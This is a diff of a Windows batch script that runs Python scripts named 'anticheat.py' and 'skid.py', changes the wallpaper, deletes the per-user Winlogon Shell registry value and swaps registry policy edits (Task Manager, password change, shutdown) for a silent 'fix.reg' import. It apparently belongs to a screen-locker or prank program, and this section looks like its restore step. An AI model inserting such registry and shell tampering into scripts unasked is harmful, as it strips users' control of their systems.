@@ -22,11 +22,8 @@ start calc
 start python\pythonw anticheat.py
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /f /d "%cd%\Untitled2.png"
 python\python skid.py
-reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 0 /f
 reg delete "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v shutdownwithoutlogon /t REG_DWORD /d 1 /f
-reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 0 /f
-reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f
+regedit /s fix.reg
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /f /d "%cd%\Untitled.png"
 start userinit
 taskkill /f /im pythonw.exe
